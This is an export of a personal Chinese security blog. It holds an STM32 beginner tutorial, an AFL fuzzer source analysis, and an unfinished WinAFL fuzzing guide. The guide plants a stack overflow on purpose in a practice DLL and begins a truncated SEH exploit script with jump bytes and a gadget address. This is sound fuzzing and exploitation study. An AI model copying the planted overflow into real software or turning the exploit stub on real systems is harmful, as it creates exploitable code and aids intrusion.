https://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"cve","slug":"cve","permalink":"https://joe1sn.eu.org/tags/cve/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"}]},{"title":"【STM32】1.点灯大师","slug":"stm32-1-light","date":"2023-09-10T11:51:40.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2023/09/10/stm32-1-light/","link":"","permalink":"https://joe1sn.eu.org/2023/09/10/stm32-1-light/","excerpt":"如何三小时之内，从0开始学会stm32点灯 （其实是想验证下发的芯片是不是好的）","text":"如何三小时之内，从0开始学会stm32点灯 （其实是想验证下发的芯片是不是好的） 准备工作 我是在JD上随便买的一家，有 STM32F103C8T6，面包板，USB转TTL，显示器… 缺啥少啥买配件就行了 1.软件 由于我们是小白，所以暂时不需要看电路啥的，直接先把软件装上。 STM32CubeIDE 这里我参考了：BV1HM411b78E 或者知乎的https://zhuanlan.zhihu.com/p/321845090 知乎的有一个模拟程序 驱动（因为我是USB转TTL）：CH340-驱动，这个你可以找客服要，一般都会发给你的 烧录软件：FLYMCU 首先需要熟悉的就是STM32CubeIDE的使用，可以参考上面的B站视频后者知乎，这里还有：https://www.bilibili.com/video/BV13B4y1y7yk 2.硬件 这个是始终绕不开的（除非你用EDA） 1.面包板 有时间可以参考：https://www.bilibili.com/video/BV1gz4y1Z7N7 或者 导线就是这样连接的 2.STM32F103C8T6 显示再IDE中的 比如这里的PA0就是代表芯片的A0接口 这里的GPIO_Output代表的是信号输出（严格来说不是这样的）。具体的设置可以参考https://www.bilibili.com/video/BV1ja411J766 在main.c中的main函数的while死循环里面有 1234567891011/* Infinite loop *//* USER CODE BEGIN WHILE */while (1)&#123; /* USER CODE END WHILE */ HAL_GPIO_TogglePin(GPIOA, LED1_Pin); HAL_Delay(200); HAL_GPIO_TogglePin(GPIOA, LED2_Pin); HAL_Delay(200); /* USER CODE BEGIN 3 */&#125; LED1_Pin和LED2_Pin是我给的命名，然后编译就好了 3.烧录 可以参考 https://www.bilibili.com/video/BV1wR4y1y7E2/ https://www.bilibili.com/video/BV1P24y1L7Ho PA9&lt;–&gt;RXD PA10&lt;–&gt;TXD 设置条线： 开始FLYMCU烧录 选hex文件烧进去就行了 如果你像我上图那样外接电源，在烧录的时候也是需要将其插入USB接口中的 3.电路 不知道二极管功率的最好加上1k欧的电阻，信号时从A0和A1输出，最后流向的是G跳线（参考上图） 调回boot条线，按下复位键： 成功点亮","categories":[{"name":"hardware","slug":"hardware","permalink":"https://joe1sn.eu.org/categories/hardware/"}],"tags":[{"name":"stm32","slug":"stm32","permalink":"https://joe1sn.eu.org/tags/stm32/"}]},{"title":"【源码分析】AFL源代码分析","slug":"afl-source","date":"2023-07-22T00:41:03.000Z","updated":"2025-01-26T14:46:00.817Z","comments":true,"path":"2023/07/22/afl-source/","link":"","permalink":"https://joe1sn.eu.org/2023/07/22/afl-source/","excerpt":"其实还是挺简单的","text":"其实还是挺简单的 在一次期末报告里面做了这个报告 关于AFL的基本步骤 工作流程基本上可以用 5 个步骤来描述：预处理、输入构建、输入选择、评估、后模糊测试。 真正的内核处理是步骤 2 到 4 预处理 分析和获取有用信息，使用PIN，符号执行，污点检查 黑盒白盒 输入构建 从数据 S（种子）产生大量变异数据 I。 输入选择 过滤无效数据，优化模糊测试 评估 大多数关于模糊的研究集中在两个指标上：覆盖率和利用漏洞的平均时间 源码分析 编译插桩 afl-gcc 根据使用方法，首先是使用afl-gcc进行编译，在编译时就完成插桩 本就是是包裹的GCC盒CLANG 12345678910111213141516171819202122232425262728293031323334353637int main(int argc, char** argv) &#123; if (isatty(2) &amp;&amp; !getenv(&quot;AFL_QUIET&quot;)) &#123; SAYF(cCYA &quot;afl-cc &quot; cBRI VERSION cRST &quot; by &lt;lcamtuf@google.com&gt;\\n&quot;); &#125; else be_quiet = 1; if (argc &lt; 2) &#123; SAYF(&quot;\\n&quot; &quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\\n&quot; &quot;for gcc or clang, letting you recompile third-party code with the required\\n&quot; &quot;runtime instrumentation. A common use pattern would be one of the following:\\n\\n&quot; &quot; CC=%s/afl-gcc ./configure\\n&quot; &quot; CXX=%s/afl-g++ ./configure\\n\\n&quot; &quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\\n&quot; &quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\\n\\n&quot;, BIN_PATH, BIN_PATH); exit(1); &#125; find_as(argv[0]); edit_params(argc, argv); execvp(cc_params[0], (char**)cc_params); FATAL(&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;, cc_params[0]); return 0;&#125; SAYF就是fprintf函数，检测到参数小于2的时候报错并退出 使用find_as进行参数的解析到自身程序路径，找到afl-as的afl汇编器 edit_params中，解析参数，设置自生对应的编译器，获得和设置一系列环境变量，最后得到的cc_params就是编译参数 execvp(cc_params[0], (char**)cc_params);，通过前面找到的汇编器as_path和参数创建进程进行插桩编译。（具体就是替换了程序名称之类的，源码很简单） afl-as main 进入main创建了一些列变量然后就是在a 中将 cc_params 转为as_params add_instrumentation 重头函数 1234567891011121314151617181920while (fgets(line, MAX_LINE, inf)) &#123; /* In some cases, we want to defer writing the instrumentation trampoline until after all the labels, macros, comments, etc. If we&#x27;re in this mode, and if the line starts with a tab followed by a character, dump the trampoline now. */ if (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp; instrument_next &amp;&amp; line[0] == &#x27;\\t&#x27; &amp;&amp; isalpha(line[1])) &#123; fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE)); instrument_next = 0; ins_lines++; &#125; .... ....&#125; 所以，AFL的代码插桩，就是在将源文件编译为汇编代码后，通过afl-as完成。开始重写汇编指令，准备在分支处插入代码 先看看32位，64位和这个也差不多 trampoline_fmt_32 12345678910111213141516171819202122static const u8* trampoline_fmt_32 = &quot;\\n&quot; &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\\n&quot; &quot;\\n&quot; &quot;.align 4\\n&quot; &quot;\\n&quot; &quot;leal -16(%%esp), %%esp\\n&quot; &quot;movl %%edi, 0(%%esp)\\n&quot; &quot;movl %%edx, 4(%%esp)\\n&quot; &quot;movl %%ecx, 8(%%esp)\\n&quot; &quot;movl %%eax, 12(%%esp)\\n&quot; &quot;movl $0x%08x, %%ecx\\n&quot; &quot;call __afl_maybe_log\\n&quot; &quot;movl 12(%%esp), %%eax\\n&quot; &quot;movl 8(%%esp), %%ecx\\n&quot; &quot;movl 4(%%esp), %%edx\\n&quot; &quot;movl 0(%%esp), %%edi\\n&quot; &quot;leal 16(%%esp), %%esp\\n&quot; &quot;\\n&quot; &quot;/* --- END --- */\\n&quot; &quot;\\n&quot;; 这就是汇编，听chatGPT说 12345678910111213141516section .textglobal _start_start: lea esp, [esp-16] ; leal -16(%esp), %esp mov [esp], edi ; movl %edi, 0(%esp) mov [esp+4], edx ; movl %edx, 4(%esp) mov [esp+8], ecx ; movl %ecx, 8(%esp) mov [esp+12], eax ; movl %eax, 12(%esp) mov ecx, 0x08000000 ; movl $0x%08x, %ecx call __afl_maybe_log ; call __afl_maybe_log mov eax, [esp+12] ; movl 12(%esp), %eax mov ecx, [esp+8] ; movl 8(%esp), %ecx mov edx, [esp+4] ; movl 4(%esp), %edx mov edi, [esp] ; movl 0(%esp), %edi lea esp, [esp+16] ; leal 16(%esp), %esp 32位是经典的栈传参，这里使用对esp的移动实现了从edi edx ecx eax的保存，然后又将ecx设置为了0x08000000，这个是chatGPT翻译错了，正确的理解是&quot;%08x&quot; 是格式说明符，用于将一个整数格式化为一个带有前导零的 8 位十六进制数。例如，“%08x” 将把数字 10 格式化为 “0000000A”。这段汇编仍然是属于C语言的范畴。 似乎我们下一步要看的是__afl_maybe_log，**但是你就没想过R(MAP_SIZE)**有什么用吗？R(x)的定义是(random() % (x))，所以R(MAP_SIZE)即为0到MAP_SIZE之间的一个随机数。 因此，在处理到某个分支，需要插入桩代码时，afl-as会生成一个随机数，作为运行时保存在ecx中的值。而这个随机数，便是用于标识这个代码块的key。 接下来来到__afl_maybe_log 运行 开始fuzz，那么afl如何启动这个程序，可以看看afl-fuzz.c，不过最开始后世设置参数，这里将重要点的部分。 调用的链条有点复杂首先在L8044 1skipped_fuzz = fuzz_one(use_argv); 然后的fuzz_one中，使用队列queue_cur来管理 1res = calibrate_case(argv, queue_cur, in_buf, queue_cycle - 1, 0); 在calibrate_case 12if (dumb_mode != 1 &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid) init_forkserver(argv); 总算是找到了 为了更高效地进行上述过程，AFL实现了一套fork server机制。其基本思路是：启动target进程后，target会运行一个fork server；fuzzer并不负责fork子进程，而是与这个fork server通信，并由fork server来完成fork及继续执行目标的操作。这样设计的最大好处，就是不需要调用execve()，从而节省了载入目标文件和库、解析符号地址等重复性工作 L1987 123int st_pipe[2], ctl_pipe[2];....forksrv_pid = fork(); 使用pipe和forkserver进行通讯 L2088的位置开始执行execv(target_path, argv);。其实看到这里我也很疑惑上面的解释 在L2103中测试和forkserver的通讯 1234567891011 fsrv_ctl_fd = ctl_pipe[1]; fsrv_st_fd = st_pipe[0]; rlen = read(fsrv_st_fd, &amp;status, 4);... /* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set. Otherwise, try to figure out what went wrong. */ if (rlen == 4) &#123; OKF(&quot;All right - fork server is up.&quot;); return; &#125; 接下来的fork server是如何与fuzzer通信是面试考点（/doge） forkserver 知道创宇不知道是讲的太碎了还是我理解有问题，在这里我就不怎么追的了代码了，不过想起开始说过的：fuzzer并不负责fork子进程，而是与这个fork server通信，并由fork server来完成fork及继续执行目标的操作，那么很有可能和插进去的__afl_maybe_log一样是插入入进去了一个forkserver在代码当中，那么回到afl-as，L446 12if (ins_lines) fputs(use_64bit ? main_payload_64 : main_payload_32, outf); 依然以32位举例子main_payload_32 123456789101112131415161718192021&quot;__afl_forkserver:\\n&quot; &quot;\\n&quot; &quot; /* Enter the fork server mode to avoid the overhead of execve() calls. */\\n&quot; &quot;\\n&quot; &quot; pushl %eax\\n&quot; &quot; pushl %ecx\\n&quot; &quot; pushl %edx\\n&quot; &quot;\\n&quot; &quot; /* Phone home and tell the parent that we&#x27;re OK. (Note that signals with\\n&quot; &quot; no SA_RESTART will mess it up). If this fails, assume that the fd is\\n&quot; &quot; closed because we were execve()d from an instrumented binary, or because\\n&quot; &quot; the parent doesn&#x27;t want to use the fork server. */\\n&quot; &quot;\\n&quot; &quot; pushl $4 /* length */\\n&quot; &quot; pushl $__afl_temp /* data */\\n&quot; &quot; pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot; /* file desc */\\n&quot; &quot; call write\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; cmpl $4, %eax\\n&quot; &quot; jne __afl_fork_resume\\n&quot; 看注释也看的明白了，给fuzzer说已经准备完毕，其中$__afl_temp就是四字节长度的验证信息，然后开始等待循环，读取命令管道，直到fuzzer通知其开始 123456789101112&quot;__afl_fork_wait_loop:\\n&quot;&quot;\\n&quot;&quot; /* Wait for parent by reading from the pipe. Abort if read fails. */\\n&quot;&quot;\\n&quot;&quot; pushl $4 /* length */\\n&quot;&quot; pushl $__afl_temp /* data */\\n&quot;&quot; pushl $&quot; STRINGIFY(FORKSRV_FD) &quot; /* file desc */\\n&quot;&quot; call read\\n&quot;&quot; addl $12, %esp\\n&quot;&quot;\\n&quot;&quot; cmpl $4, %eax\\n&quot;&quot; jne __afl_die\\n&quot; 有错误就寄__afl_die，那么成功的话 12345678910&quot; /* Once woken up, create a clone of our process. This is an excellent use\\n&quot;&quot; case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\\n&quot;&quot; caches getpid() results and offers no way to update the value, breaking\\n&quot;&quot; abort(), raise(), and a bunch of other things :-( */\\n&quot;&quot;\\n&quot;&quot; call fork\\n&quot;&quot;\\n&quot;&quot; cmpl $0, %eax\\n&quot;&quot; jl __afl_die\\n&quot;&quot; je __afl_fork_resume\\n&quot; 得到父子进程的ID，对待子进程走到__afl_fork_resume 12345678910111213141516&quot;__afl_fork_resume:\\n&quot; &quot;\\n&quot; &quot; /* In child process: close fds, resume execution. */\\n&quot; &quot;\\n&quot; &quot; pushl $&quot; STRINGIFY(FORKSRV_FD) &quot;\\n&quot; &quot; call close\\n&quot; &quot;\\n&quot; &quot; pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;\\n&quot; &quot; call close\\n&quot; &quot;\\n&quot; &quot; addl $8, %esp\\n&quot; &quot;\\n&quot; &quot; popl %edx\\n&quot; &quot; popl %ecx\\n&quot; &quot; popl %eax\\n&quot; &quot; jmp __afl_store\\n&quot; 对于大于0的返回值（即父进程）他继续运行 12345678910111213141516171819202122232425262728&quot; /* In parent process: write PID to pipe, then wait for child. */\\n&quot; &quot;\\n&quot; &quot; movl %eax, __afl_fork_pid\\n&quot; &quot;\\n&quot; &quot; pushl $4 /* length */\\n&quot; &quot; pushl $__afl_fork_pid /* data */\\n&quot; &quot; pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot; /* file desc */\\n&quot; &quot; call write\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; pushl $0 /* no flags */\\n&quot; &quot; pushl $__afl_temp /* status */\\n&quot; &quot; pushl __afl_fork_pid /* PID */\\n&quot; &quot; call waitpid\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; cmpl $0, %eax\\n&quot; &quot; jle __afl_die\\n&quot; &quot;\\n&quot; &quot; /* Relay wait status to pipe, then loop back. */\\n&quot; &quot;\\n&quot; &quot; pushl $4 /* length */\\n&quot; &quot; pushl $__afl_temp /* data */\\n&quot; &quot; pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot; /* file desc */\\n&quot; &quot; call write\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; jmp __afl_fork_wait_loop\\n&quot; 继续进行forkserver的管道通讯，然后__afl_fork_wait_loop， fuzzer 回顾一下目前“栈”的情况：main -&gt; calibrate_case -&gt; init_forkserver ​ 回退到calibrate_case继续执行，write_to_testcase就是设置测试样例，重点在于run_target。AFL的文件编译策略不是胡乱变换的，主要是dumb_mode有没有被开启，一般都是不会开启的，那么就来到了L2362 12345678910111213141516171819202122 s32 res; /* In non-dumb mode, we have the fork server up and running, so simply tell it to have at it, and then read back PID. */ if ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, 4)) != 4) &#123; if (stop_soon) return 0; RPFATAL(res, &quot;Unable to request new process from fork server (OOM?)&quot;); &#125; if ((res = read(fsrv_st_fd, &amp;child_pid, 4)) != 4) &#123; if (stop_soon) return 0; RPFATAL(res, &quot;Unable to request new process from fork server (OOM?)&quot;); &#125; if (child_pid &lt;= 0) FATAL(&quot;Fork server is misbehaving (OOM?)&quot;);&#125; 看注释和代码，知道通过管道向forkserver通知准备完毕，并得到返回的PID，然后就是L2438 123456789if (WIFSIGNALED(status) &amp;&amp; !stop_soon) &#123; kill_signal = WTERMSIG(status); if (child_timed_out &amp;&amp; kill_signal == SIGKILL) return FAULT_TMOUT; return FAULT_CRASH;&#125; fuzzer再次读取状态管道，获取子进程退出状态，并由此来判断子进程结束的原因，例如正常退出、超时、崩溃等，并进行相应的记录 共享内存机制 解决程序插桩和启动运行后，就来到了对示例的fuzz阶段。在程序待测试部分，程序先是初始化变异方式。AFL通过共享内存机制来方便高并发的样例读取，减小IO的损耗。 代码不长这里贴一下 12345678910111213141516171819202122232425262728293031EXP_ST void setup_shm(void) &#123; u8* shm_str; if (!in_bitmap) memset(virgin_bits, 255, MAP_SIZE); memset(virgin_tmout, 255, MAP_SIZE); memset(virgin_crash, 255, MAP_SIZE); shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600); if (shm_id &lt; 0) PFATAL(&quot;shmget() failed&quot;); atexit(remove_shm); shm_str = alloc_printf(&quot;%d&quot;, shm_id); /* If somebody is asking us to fuzz instrumented binaries in dumb mode, we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending fork server commands. This should be replaced with better auto-detection later on, perhaps? */ if (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, 1); ck_free(shm_str); trace_bits = shmat(shm_id, NULL, 0); if (!trace_bits) PFATAL(&quot;shmat() failed&quot;);&#125; 在afl-fuzz的L7955来到setup_shm，这里设置共享内存，然后从shemget()（这是一个LinuxC的函数）获得一块内存。 shmget() returns the identifier of the System V shared memory segment associated with the value of the argu‐ ment key. A new shared memory segment, with size equal to the value of size rounded up to a multiple of PAGE_SIZE, is created if key has the value IPC_PRIVATE or key isn’t IPC_PRIVATE, no shared memory segment cor‐ responding to key exists, and IPC_CREAT is specified in shmflg. 子进程通过环境变量SHM_ENV_VAR得到内存，对于fuzzer本身则会回到trace_bits保存内存地址 shmat() attaches the System V shared memory segment identified by shmid to the address space of the calling process. 我们在且回到被测试的target中，看下他被插桩的代码（早于之前的forkserver） 123456&quot; /* Check if SHM region is already mapped. */\\n&quot; &quot;\\n&quot; &quot; movl __afl_area_ptr, %edx\\n&quot; &quot; testl %edx, %edx\\n&quot; &quot; je __afl_setup\\n&quot; &quot;\\n&quot; __afl_area_ptr：共享内存映射到target的内存空间中的地址 __afl_setup：获取环境变量AFL_SHM_ENV的内容并将其转为整型，最后，通过调用shmat()，target将这块共享内存也映射到了自己的内存空间中，并将其地址保存在__afl_area_ptr及edx中 12345678910111213141516171819202122232425262728293031323334&quot;\\n&quot; &quot;__afl_setup:\\n&quot; &quot;\\n&quot; &quot; /* Do not retry setup if we had previous failures. */\\n&quot; &quot;\\n&quot; &quot; cmpb $0, __afl_setup_failure\\n&quot; &quot; jne __afl_return\\n&quot; &quot;\\n&quot; &quot; /* Map SHM, jumping to __afl_setup_abort if something goes wrong.\\n&quot; &quot; We do not save FPU/MMX/SSE registers here, but hopefully, nobody\\n&quot; &quot; will notice this early in the game. */\\n&quot; &quot;\\n&quot; &quot; pushl %eax\\n&quot; &quot; pushl %ecx\\n&quot; &quot;\\n&quot; &quot; pushl $.AFL_SHM_ENV\\n&quot; &quot; call getenv\\n&quot; &quot; addl $4, %esp\\n&quot; &quot;\\n&quot; &quot; testl %eax, %eax\\n&quot; &quot; je __afl_setup_abort\\n&quot; &quot;\\n&quot; &quot; pushl %eax\\n&quot; &quot; call atoi\\n&quot; &quot; addl $4, %esp\\n&quot; &quot;\\n&quot; &quot; pushl $0 /* shmat flags */\\n&quot; &quot; pushl $0 /* requested addr */\\n&quot; &quot; pushl %eax /* SHM ID */\\n&quot; &quot; call shmat\\n&quot; &quot; addl $12, %esp\\n&quot; &quot;\\n&quot; &quot; cmpl $-1, %eax\\n&quot; &quot; je __afl_setup_abort\\n&quot; 分支信息的记录 来到文章开始抛出的疑问__afl_maybe_log干了什么 123456789101112&quot;__afl_maybe_log:\\n&quot;&quot;\\n&quot;&quot; lahf\\n&quot;&quot; seto %al\\n&quot;&quot;\\n&quot;&quot; /* Check if SHM region is already mapped. */\\n&quot;&quot;\\n&quot;&quot; movl __afl_area_ptr, %edx\\n&quot;&quot; testl %edx, %edx\\n&quot;&quot; je __afl_setup\\n&quot;&quot;\\n&quot;&quot;__afl_store:\\n&quot; 读代码就知道了： 检查共享内存的映射，有错进入到__afl_setup 开始__afl_store： 123456789101112131415161718192021 &quot;__afl_store:\\n&quot; &quot;\\n&quot; &quot; /* Calculate and store hit for the code location specified in ecx. There\\n&quot; &quot; is a double-XOR way of doing this without tainting another register,\\n&quot; &quot; and we use it on 64-bit systems; but it&#x27;s slower for 32-bit ones. */\\n&quot; &quot;\\n&quot;#ifndef COVERAGE_ONLY &quot; movl __afl_prev_loc, %edi\\n&quot; &quot; xorl %ecx, %edi\\n&quot; &quot; shrl $1, %ecx\\n&quot; &quot; movl %ecx, __afl_prev_loc\\n&quot;#else &quot; movl %ecx, %edi\\n&quot;#endif /* ^!COVERAGE_ONLY */ &quot;\\n&quot;#ifdef SKIP_COUNTS &quot; orb $1, (%edx, %edi, 1)\\n&quot;#else &quot; incb (%edx, %edi, 1)\\n&quot;#endif /* ^SKIP_COUNTS */ &quot;\\n&quot; __afl_prev_loc：前一次跳转的”位置” ecx：最开始插桩的随机数位置，即代码块的标号 因此，AFL为每个代码块生成一个随机数，作为其“位置”的记录；随后，对分支处的”源位置“和”目标位置“进行异或，并将异或的结果作为该分支的key，保存每个分支的执行次数。用于保存执行次数的实际上是一个哈希表，大小为MAP_SIZE=64K，当然会存在碰撞的问题；但根据AFL文档中的介绍，对于不是很复杂的目标，碰撞概率还是可以接受的： 在最后map density就是指的哈希表的密度，越小发生碰撞的概率越小 分支信息的分析 前文提到了 trace_bits保存了共享内存 共享内存保存了分析记录 那么，对于AFL从这块共享内存中获得信息就显得很合理了 在预处理共享内存时 1234567891011121314151617181920static inline void classify_counts(u32* mem) &#123; u32 i = MAP_SIZE &gt;&gt; 2; while (i--) &#123; /* Optimize for sparse bitmaps. */ if (unlikely(*mem)) &#123; u16* mem16 = (u16*)mem; mem16[0] = count_class_lookup16[mem16[0]]; mem16[1] = count_class_lookup16[mem16[1]]; &#125; mem++; &#125;&#125; 12345678910111213141516/* Destructively classify execution counts in a trace. This is used as a preprocessing step for any newly acquired traces. Called on every exec, must be fast. */static const u8 count_class_lookup8[256] = &#123; [0] = 0, [1] = 1, [2] = 2, [3] = 4, [4 ... 7] = 8, [8 ... 15] = 16, [16 ... 31] = 32, [32 ... 127] = 64, [128 ... 255] = 128&#125;; 最重要的是count_class_lookup8，target是将每个分支的执行次数用1个byte来储存，而fuzzer则进一步把这个执行次数归入buckets中，比如执行1次，mem16 = count_class_lookup8[1]; == 1 执行3次mem16 = count_class_lookup8[3]; == 4。执行4次mem16 = count_class_lookup8[4]; == 8 好处就在于分支A执行了32次；对另外一个测试用例，分支A执行了33次，那么AFL就会认为这两次的代码覆盖是相同的。这样通过代码块的执行次数就可以统计相关路径，AFL根据相关路径的HASH判断路径是否发生改变。 文件变异规则 看到好多研究生论文都是从这里下手的。。。 bitflip，按位翻转，1变为0，0变为1 在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的 arithmetic，整数加/减算术运算 对目标整数会进行+1, +2, …, +35, -1, -2, …, -35的变异。特别地，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。 interest，把一些特殊内容替换到原文件中 用于替换的&quot;interesting values&quot;，是AFL预设的一些比较特殊的数。 config.h 1234567891011121314151617181920212223242526272829303132#define INTERESTING_8 \\ -128, /* Overflow signed 8-bit when decremented */ \\ -1, /* */ \\ 0, /* */ \\ 1, /* */ \\ 16, /* One-off with common buffer size */ \\ 32, /* One-off with common buffer size */ \\ 64, /* One-off with common buffer size */ \\ 100, /* One-off with common buffer size */ \\ 127 /* Overflow signed 8-bit when incremented */#define INTERESTING_16 \\ -32768, /* Overflow signed 16-bit when decremented */ \\ -129, /* Overflow signed 8-bit */ \\ 128, /* Overflow signed 8-bit */ \\ 255, /* Overflow unsig 8-bit when incremented */ \\ 256, /* Overflow unsig 8-bit */ \\ 512, /* One-off with common buffer size */ \\ 1000, /* One-off with common buffer size */ \\ 1024, /* One-off with common buffer size */ \\ 4096, /* One-off with common buffer size */ \\ 32767 /* Overflow signed 16-bit when incremented */#define INTERESTING_32 \\ -2147483648LL, /* Overflow signed 32-bit when decremented */ \\ -100663046, /* Large negative number (endian-agnostic) */ \\ -32769, /* Overflow signed 16-bit */ \\ 32768, /* Overflow signed 16-bit */ \\ 65535, /* Overflow unsig 16-bit when incremented */ \\ 65536, /* Overflow unsig 16 bit */ \\ 100663045, /* Large positive number (endian-agnostic) */ \\ 2147483647 /* Overflow signed 32-bit when incremented */ dictionary，把自动生成或用户提供的token替换/插入到原文件中（从头开始） -x选项设置的token havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异，具体见下文 开始智力下降，我在fuzz中看到的大多数都是这个阶段（阿巴阿巴） 随机选取某个bit进行翻转 随机选取某个byte，将其设置为随机的interesting value 随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value 随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value 随机选取某个byte，对其减去一个随机数 随机选取某个byte，对其加上一个随机数 随机选取某个word，并随机选取大、小端序，对其减去一个随机数 随机选取某个word，并随机选取大、小端序，对其加上一个随机数 随机选取某个dword，并随机选取大、小端序，对其减去一个随机数 随机选取某个dword，并随机选取大、小端序，对其加上一个随机数 随机选取某个byte，将其设置为随机数 随机删除一段bytes 随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数 随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数 随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换 随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入 splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件 splice是将两个seed文件拼接得到新的文件，并对这个新文件继续执行havoc变异 cycle：对队列所有文件全部按照上面的步骤来一遍就算完成了一个cycle，整个队列又会从第一个文件开始，再次进行变异，不过与第一次变异不同的是，这一次就不需要再进行deterministic fuzzing了。 参考 https://paper.seebug.org/496/ https://github.com/google/AFL","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"source","slug":"source","permalink":"https://joe1sn.eu.org/tags/source/"},{"name":"AFL","slug":"AFL","permalink":"https://joe1sn.eu.org/tags/AFL/"}]},{"title":"【漏洞挖掘】win-afl使用指北-中级篇","slug":"win-afl2","date":"2023-07-19T14:06:52.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2023/07/19/win-afl2/","link":"","permalink":"https://joe1sn.eu.org/2023/07/19/win-afl2/","excerpt":"为什么不叫高级篇，因为高级的我也不会 主要讲一下更贴近实际的用法吧 !!!仅大标题1完成，全片未完待续!!!","text":"为什么不叫高级篇，因为高级的我也不会 主要讲一下更贴近实际的用法吧 !!!仅大标题1完成，全片未完待续!!! 对DLL进行Fuzz 理论测试 代码还是上一篇提到的代码，依旧是32位，只不过溢出部分写在DLL里面 dll.c 123456789101112131415161718192021#include &lt;stdio.h&gt;__declspec(dllexport) void vuln(char *FileDir)&#123; char password[6] = &quot;ABCDE&quot;; char str[6]; FILE *fp; if(!(fp=fopen(FileDir,&quot;r&quot;)))&#123; printf(&quot;Open Failed\\n&quot;); exit(0); &#125; fgets(str, 0x1000, fp); str[5]=&#x27;\\0&#x27;; if(strcmp(str,password)==0) // fprintf(stderr,&quot;OK.\\n&quot;); printf(&quot;OK.\\n&quot;); else // fprintf(stderr,&quot;NO.\\n&quot;); printf(&quot;NO.\\n&quot;);&#125; 编译 1gcc -shared -o mydll.dll dll.c main.c 12345678910111213#include &lt;stdio.h&gt;__declspec(dllimport) void vuln();int main(int argc, char *argv[])&#123; if (argc != 2)&#123; printf(&quot;Usage: ./HelloWorld.exe FileName\\n&quot;); return 0; &#125; vuln(argv[1]); return 0;&#125; 1gcc -o main main.c mydll.dll 不想联合编译的话也可以使用GetProAddress来编写如下harness 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;windows.h&gt;typedef DWORD(__cdecl *pvuln)(char* aFileName);pvuln vuln = NULL;extern &quot;C&quot; __declspec(dllexport) int main(int argc, char *argv[])&#123; char mydll_path[] = &quot;D:\\\\HackTools\\\\Fuzz\\\\WinAFLFuzz\\\\testcase\\\\dll\\\\mydll.dll&quot;; if (argc != 2)&#123; printf(&quot;Usage: ./HelloWorld.exe FileName\\n&quot;); return 0; &#125; static HMODULE hMyDLL = NULL; hMyDLL = LoadLibraryA(mydll_path); if(hMyDLL == NULL)&#123; printf(&quot;Load DLL Failed\\n&quot;); goto END; &#125; vuln = (pvuln)GetProcAddress(hMyDLL,&quot;vuln&quot;); if(vuln == NULL)&#123; printf(&quot;Get Process Address Failed\\n&quot;); goto END; &#125; vuln(argv[1]);END: if(hMyDLL)&#123; FreeLibrary(hMyDLL); &#125; return 0;&#125; 开始插桩看看 12345678D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32\\drrun.exe ^-c D:\\HackTools\\Fuzz\\__FuzzWork\\winafl\\build_Win32\\bin\\Release\\winafl.dll -debug ^-debug ^-coverage_module mydll.dll ^-target_module main.exe ^-target_offset 0x16B0 ^-fuzz_iterations 10 -nargs 2 -- ^main.exe .\\in\\password.txt 开始fuzz 12345678910afl-fuzz.exe ^-i .\\in ^-o .\\out ^-D &quot;D:\\HackTools\\Fuzz\\__FuzzWork\\dynamorio\\build_Win32\\bin32&quot; ^-I 100000+ -t 90000+ -- ^-coverage_module mydll.dll ^-target_module main.exe ^-target_offset 0x16B0 ^-fuzz_iterations 5000 -nargs 2 -- ^main.exe @@ 瞬间找到crash 样本长这样 这次尝试使用x32dbg分析 得到EXP 12345678910111213payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*(0x12c-len(shellcode)-32) #0x1cNSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\xEA\\x23\\x40\\x00&quot; #004023EAself_gadget = 